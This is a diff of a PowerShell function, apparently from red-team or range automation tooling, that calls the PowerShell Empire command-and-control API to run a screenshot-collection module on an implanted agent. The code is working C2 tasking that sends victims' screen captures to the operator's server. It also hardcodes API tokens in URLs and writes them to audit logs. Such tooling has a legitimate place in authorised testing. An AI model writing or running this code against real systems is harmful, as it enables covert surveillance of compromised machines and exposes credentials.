@@ -58,23 +58,27 @@ function Get-EmpireModules
 function Start-BSEmpireModuleOnAgent
 {
     Param(
-        $EmpireBox = '192.168.200.108',
-        $EmpireToken = 'svcx1oa9ynrqy0pc089qs4s0askox1evhk3c9k6w',
+        $EmpireBox = '192.168.200.106',
+        $EmpireToken = 'eoxexp9ziywcb3vih3fipyk2a8gufq7olfihxpxx',
         $EmpirePort = '1337',
-        $AgentName = "1C5UE7S8",
-        $ModuleName = "powershell/collection/screenshot",
-        $Options = "" 
+        $AgentName = '8BYZEAXN',
+        $ModuleName = 'powershell/collection/screenshot',
+        $Options = $null
     )
 
     $moduleURI = "https://$EmpireBox`:$EmpirePort/api/modules/"+$ModuleName+"?token=$EmpireToken"
     $PostBody = '{"Agent":"'+$AgentName+'"}'
 
-    if($Options -ne "")
+    if($Options)
     {
         $PostBodyWithOptions = '{"Agent":"'+$AgentName+'",'+$Options+'}'
         $PostBody = $PostBodyWithOptions
     }
+    
+    Write-BSAuditLog -BSLogContent ("Module URI: " + $moduleURI)
+    Write-BSAuditLog -BSLogContent ("Post Body: " + $PostBody)
 
+    # TODO : MODULE OPTIONS IMPLEMENTATION
     <#
     # Guessing this is like...
     # {
@@ -86,15 +90,22 @@ function Start-BSEmpireModuleOnAgent
     
     #Get Agents
     $ModuleExecution = Invoke-WebRequest -Method Post -uri $moduleURI -Body $PostBody -ContentType 'application/json'
-        
+   
+    $ModuleExecutionStatusCode = $ModuleExecution.StatusCode
 
-    $ModuleExecution = $ModuleExecution.Content | ConvertFrom-Json
+    Write-BSAuditLog -BSLogContent ("Execution Code: " + $ModuleExecutionStatusCode)
 
+    if($ModuleExecutionStatusCode -eq '200')
+    {
+        $ModuleExecution = $ModuleExecution.Content | ConvertFrom-Json
+        $Return = (($ModuleExecution.msg) + " Execution Status: " + ($ModuleExecution.success))
 
-    ##TODO Module History... for now just report status
-    $Return = (($ModuleExecution.msg) + " Execution Status: " + ($ModuleExecution.success))
-
-    return $Return 
+        return $Return 
+    }
+    else 
+    {
+        return ("Execution Status: FAILED")
+    }
 
 }
 
